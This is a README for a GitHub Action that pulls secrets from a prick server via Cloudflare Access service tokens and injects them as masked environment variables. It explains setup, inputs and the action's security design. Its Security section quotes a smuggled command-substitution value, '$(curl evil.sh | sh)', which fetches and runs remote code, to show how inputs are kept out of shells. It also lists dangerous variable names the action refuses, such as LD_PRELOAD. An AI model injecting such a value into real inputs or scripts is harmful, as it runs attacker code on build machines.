# `yashau/prick/action`

Read a project environment from your prick server and hand every secret in it to the rest of the
job as a masked environment variable.

```yaml
- uses: yashau/prick/action@v2026.819.0
  with:
    url: ${{ secrets.PRICK_URL }}
    client-id: ${{ secrets.PRICK_ACCESS_CLIENT_ID }}
    client-secret: ${{ secrets.PRICK_ACCESS_CLIENT_SECRET }}
    project: api
    environment: production

- run: ./deploy.sh # DATABASE_URL, STRIPE_KEY, ... are all just there
```

Without this action the same thing means installing the CLI, wiring up the API URL, exporting two
Access headers and shelling out to `eval` in every workflow that needs a secret. This is the
one-liner version of that, and it is the only version that masks the values before they can reach
a log.

## You need an Access **service token**, not a login

`prk login` gets you an interactive SSO session in a browser. A GitHub runner has no browser and no
human, so that is not the credential to use here. Cloudflare Access issues a second kind of identity
for exactly this — a **service token**, a client id and client secret pair that is presented as the
`CF-Access-Client-Id` and `CF-Access-Client-Secret` headers and never expires on its own.

**Creating one**, in the Cloudflare dashboard:

1. **Zero Trust → Access → Service auth → Service Tokens → Create Service Token.** Name it after the
   thing that will use it (`github-actions-api-deploy`), not after the person creating it.
2. Copy the **Client ID** (it ends in `.access`) and the **Client Secret**. The secret is shown
   **once**. Store both as repository or environment secrets in GitHub.
3. Add the token to the Access policy in front of your prick server: edit the application's policy,
   add an **include** rule of type **Service Auth → the token you just created**, and make sure the
   policy's action is **Service Auth** rather than Allow. A policy that only lists human identities
   will reject the token at the edge, before prick ever sees the request.
4. Grant the token a role **inside prick**. Access decides _who_ is calling; prick decides _what
   they may read_, and a brand-new token may read nothing. The easy way round is to run the workflow
   once, let it fail with a 403, then open **Access → Seen but not granted** in the prick admin UI —
   the denied client id is sitting there with a Grant button next to it. `reader` on the project (or
   on the single environment) is enough.

Step 4 is the usual first-run failure, and the action's error message says so.

## Inputs

| Input                | Required | Default              | Meaning                                                                              |
| -------------------- | -------- | -------------------- | ------------------------------------------------------------------------------------ |
| `url`                | yes      | —                    | Base URL of your prick server. **Must be `https`** — see [Security](#security)       |
| `client-id`          | yes      | —                    | Access service token client id, the one ending in `.access`                          |
| `client-secret`      | yes      | —                    | Access service token client secret                                                   |
| `project`            | yes      | —                    | Project to read. Matched exactly, case-sensitively                                   |
| `environment`        | no       | `production`         | Environment to read. Matched exactly, case-sensitively                               |
| `keys`               | no       | _(all)_              | Allowlist of secret names, newline- or comma-separated                               |
| `prefix`             | no       | _(none)_             | Prepended to every variable name, e.g. `APP_`                                        |
| `export-to`          | no       | `env`                | `env` writes to `$GITHUB_ENV`; `outputs` sets a single JSON output                   |
| `version`            | no       | _(the action's ref)_ | Version of `@yashau/prick` to install                                                |
| `mask`               | no       | `true`               | Register values with the log masker. **Setting this to `false` prints your secrets** |
| `allow-unsafe-names` | no       | `false`              | Permit `PATH`, `NODE_OPTIONS`, `LD_*`, `GITHUB_*` and friends                        |

### Outputs

| Output    | Meaning                                                                                                                             |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------- |
| `keys`    | Newline-separated names of the variables that were injected, after any prefix. Names only — never values — so this is safe to print |
| `secrets` | A JSON object of the fetched secrets. Set only when `export-to: outputs`                                                            |

## Recipes

**Only the secrets a step actually needs.** A job that asks for two variables cannot leak the other
thirty. If a listed name is not in the environment the step _fails_ rather than starting your job
without it — a build that silently loses `DATABASE_URL` fails later and far less clearly.

```yaml
- uses: yashau/prick/action@v2026.819.0
  with:
    url: ${{ secrets.PRICK_URL }}
    client-id: ${{ secrets.PRICK_ACCESS_CLIENT_ID }}
    client-secret: ${{ secrets.PRICK_ACCESS_CLIENT_SECRET }}
    project: api
    keys: |
      DATABASE_URL
      STRIPE_SECRET_KEY
```

**Two environments in one job**, kept apart by a prefix:

```yaml
- uses: yashau/prick/action@v2026.819.0
  with: { url: ..., project: api, environment: staging, prefix: STAGING_ }
- uses: yashau/prick/action@v2026.819.0
  with: { url: ..., project: api, environment: production, prefix: PROD_ }
```

**Passing a value to another action**, which needs a `with:` expression rather than an environment
variable:

```yaml
- id: prick
  uses: yashau/prick/action@v2026.819.0
  with: { url: ..., project: api, export-to: outputs }
- uses: some/other-action@v1
  with:
    token: ${{ fromJSON(steps.prick.outputs.secrets).SOME_TOKEN }}
```

Prefer `export-to: env` where you can. An output travels through more of the runner's machinery than
an environment variable does, and it is easier to print by accident.

## Versioning

The action installs `@yashau/prick` **at the action's own ref**, so
`yashau/prick/action@v2026.819.0` runs CLI `2026.819.0` and the two can never drift. A floating ref
(`@v1`, a branch, a commit SHA) names no version, so it falls back to the `latest` dist-tag; pin the
action to a release tag, or set `version:` explicitly, if you need that nailed down too.

`version` accepts an exact version, a `^`/`~` range or a dist-tag. Paths, git remotes and tarball
URLs are refused.

Whichever of those resolves, the version that is actually installed has had its provenance
attestation verified first — see Security below. A range or a dist-tag is therefore not a hole, but a
release tag still says in the workflow file which CLI a job ran.

## Requirements

Any runner with `node` and `npm` on `PATH` — every GitHub-hosted runner, on Linux, macOS and
Windows. npm 9.5 or newer, because the install step verifies the CLI's provenance with
`npm audit signatures`; every supported runner image ships one far newer.

Nothing is compiled and no build artefact is committed to this repository: the action installs the
published, provenance-attested CLI and adds the handful of readable `.mjs` files next to this README.

## Security

Things this action does on purpose, in rough order of how much they matter.

**Values are masked before they are written anywhere.** Every value is registered with the runner's
log masker — whole, and line by line for multi-line values, since no single log line ever equals a
whole PEM key — before a single byte reaches `$GITHUB_ENV`. If a later step echoes one, the log
shows `***`.

Masking is a safety net, not a boundary: it only redacts _exact_ matches. A step that base64-encodes
a secret, or prints half of it, defeats it. Do not treat a masked log as a public one.

**The CLI's provenance is verified before it is installed, and the action fails if it is not.** This
action hands the CLI a service token and every secret in an environment, so which tarball runs is the
whole question — and a consumer on a floating ref resolves the `latest` dist-tag, which an npm
account takeover moves. Every `@yashau/prick*` package is published by GitHub Actions under npm
trusted publishing and therefore carries a provenance attestation, so the install step fetches the
resolved version into a throwaway directory, has `npm audit signatures` verify that attestation and
the registry signature cryptographically, and only then installs — by exact version, so a dist-tag
that moves in between cannot slip an unaudited tarball past the check. Nothing is executed during
either fetch (`--ignore-scripts`).

It **fails closed**, on every path that is not an affirmative verification: a missing attestation, an
attestation that does not verify, a failure anywhere else in the tree, and a registry that cannot be
reached — a check that could not run is not a check that passed. The practical consequence: a
registry mirror that does not serve npm attestations is not supported, and says so rather than
quietly skipping the step.

**`http` is refused.** The service token is a bearer credential in a request header. Over plaintext
it is readable by anything on the path, and a token that reads production secrets is not something
to find out about later. A URL with `user:password@` in it is refused for the same reason.

**Values go through the heredoc form with a per-run random delimiter.** `KEY=value` cannot carry a
newline, and a fixed delimiter is a `$GITHUB_ENV` injection vector — a value containing a line equal
to it closes the block early and everything after it is parsed as further assignments. The delimiter
is 128 bits of CSPRNG per run and is additionally checked against every value being written, so the
guarantee is "cannot collide" rather than "probably will not".

**Names that control later steps are skipped.** A value written to `$GITHUB_ENV` applies to every
subsequent step in the job, so a secret named `NODE_OPTIONS`, `PATH`, `LD_PRELOAD`, `GITHUB_ENV` or
similar is a code-execution primitive handed to whoever can write to the secret store. Those are
skipped with a warning unless you pass `allow-unsafe-names: true`. A `prefix:` is usually the better
answer.

**Names that cannot be environment variables are skipped, not mangled.** A key like `my-key` or
`2FA_CODE` is reported by name and passed over; the rest of the environment is injected normally.

**Nothing you supply reaches a shell.** Inputs are passed to the script as environment variables, so
a project named `$(curl evil.sh | sh)` is a string. The CLI is spawned with a fixed argument vector,
and the URL, project, environment and token are handed to it through the environment — which also
keeps the token out of `ps` output on the runner.

**No error message can contain a value.** Error text names _keys_, which are stored in plaintext by
design and are therefore safe to echo. The one non-obvious case: when the CLI's output will not
parse as JSON, the parser's own error is thrown away rather than reported, because Node's JSON
messages quote a slice of the input — and the input is a document of secret values.

Every one of the above is a test, including one in `inject.test.mjs` that reads **every source file
in this directory** and fails if a second route to stdout or stderr ever appears anywhere in the
action. The file list is discovered rather than written down, so a module added tomorrow is audited
without anyone remembering to add it.

## Development

```bash
cd action && node --test
```

Run from inside the directory: since Node 26, `node --test <dir>` tries to load the path as a module
rather than walking it, so a positional directory argument fails. With no positional it uses Node's
own recursive discovery.

The action is `inject.mjs` — the two subcommands and the ordering that makes masking come first —
over five modules it imports:

| File         | What is in it                                                       |
| ------------ | ------------------------------------------------------------------- |
| `io.mjs`     | the mask command, the heredoc writer, the only writes to any stream |
| `cli.mjs`    | the `prk` boundary: version, argv, exit codes, output parsing       |
| `plan.mjs`   | the name grammar, the unsafe-name denylist, the injection plan      |
| `inputs.mjs` | the `PRICK_INPUT_*` variables, validated                            |
| `errors.mjs` | `ActionError`                                                       |

Each has a `*.test.mjs` beside it; `harness.mjs` holds the fakes they share and is not a test file.

No dependencies, no build step, nothing to bundle. `action.yml` is checked by `actionlint` and
`zizmor` through any workflow that references it.
